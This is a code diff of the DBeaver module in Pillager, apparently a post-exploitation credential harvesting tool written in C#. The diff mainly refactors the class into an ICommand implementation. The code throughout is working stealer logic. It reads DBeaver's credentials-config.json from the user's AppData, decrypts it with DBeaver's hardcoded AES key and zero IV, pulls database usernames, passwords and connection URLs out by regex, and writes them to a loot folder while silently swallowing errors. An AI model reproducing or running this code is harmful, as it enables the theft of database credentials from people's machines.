@@ -1,20 +1,15 @@
-﻿using Microsoft.Win32;
+﻿using Pillager.Helper;
 using System;
-using System.Collections.Generic;
 using System.IO;
-using System.Linq;
-using System.Net;
 using System.Security.Cryptography;
 using System.Text;
 using System.Text.RegularExpressions;
 
 namespace Pillager.Tools
 {
-    internal class DBeaver
+    internal class DBeaver : ICommand
     {
-        public static string ToolName = "DBeaver";
-
-        public static string ConnectionInfo(string config, string sources)
+        public string ConnectionInfo(string config, string sources)
         {
             StringBuilder sb = new StringBuilder();
             string pattern = @"\""(?<key>[^""]+)\""\s*:\s*\{\s*\""#connection\""\s*:\s*\{\s*\""user\""\s*:\s*\""(?<user>[^""]+)\""\s*,\s*\""password\""\s*:\s*\""(?<password>[^""]+)\""\s*\}\s*\}";
@@ -32,7 +27,7 @@ namespace Pillager.Tools
             return sb.ToString();
         }
 
-        public static string MatchDataSource(string json, string jdbcKey)
+        public string MatchDataSource(string json, string jdbcKey)
         {
             string pattern = $"\"({Regex.Escape(jdbcKey)})\":\\s*{{[^}}]+?\"url\":\\s*\"([^\"]+)\"[^}}]+?}}";
             Match match = Regex.Match(json, pattern);
@@ -44,12 +39,12 @@ namespace Pillager.Tools
             return "";
         }
 
-        public static string GetAppDataFolderPath()
+        public string GetAppDataFolderPath()
         {
             string appDataFolderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
             return appDataFolderPath;
         }
-        public static string Decrypt(string filePath, string keyHex, string ivHex)
+        public string Decrypt(string filePath, string keyHex, string ivHex)
         {
             byte[] encryptedBytes = File.ReadAllBytes(filePath);
             byte[] key = StringToByteArray(keyHex);
@@ -74,7 +69,7 @@ namespace Pillager.Tools
                 }
             }
         }
-        private static byte[] StringToByteArray(string hex)
+        private byte[] StringToByteArray(string hex)
         {
             int numberChars = hex.Length;
             byte[] bytes = new byte[numberChars / 2];
@@ -85,17 +80,17 @@ namespace Pillager.Tools
             return bytes;
         }
 
-        public static void Save(string path)
+        public override void Save(string path)
         {
             try
             {
                 string sources = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "DBeaverData\\workspace6\\General\\.dbeaver\\data-sources.json");
                 string credentials = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "DBeaverData\\workspace6\\General\\.dbeaver\\credentials-config.json");
                 if (!File.Exists(sources)||!File.Exists(credentials))return;
-                string savepath = Path.Combine(path, ToolName);
+                string savepath = Path.Combine(path, "DBeaver");
                 Directory.CreateDirectory(savepath);
                 string output = ConnectionInfo(Decrypt(credentials, "babb4a9f774ab853c96c2d653dfe544a", "00000000000000000000000000000000"), sources);
-                if (!string.IsNullOrEmpty(output)) File.WriteAllText(Path.Combine(savepath, ToolName + ".txt"), output);
+                if (!string.IsNullOrEmpty(output)) File.WriteAllText(Path.Combine(savepath, "DBeaver.txt"), output, Encoding.UTF8);
             }
             catch { }
         }
